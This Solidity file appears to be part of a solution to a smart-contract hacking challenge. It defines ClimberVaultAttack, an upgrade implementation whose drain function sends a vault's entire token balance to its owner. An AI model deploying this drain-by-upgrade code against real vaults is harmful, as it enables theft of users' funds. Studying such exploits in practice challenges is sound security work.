// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./ClimberVault.sol";

/**
 * @title ClimberVaultHacked
 * @author Edoardo Ierina
 */
contract ClimberVaultAttack is ClimberVault {

    function drain(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(this.owner(), token.balanceOf(address(this))), "Transfer failed");
    }
}
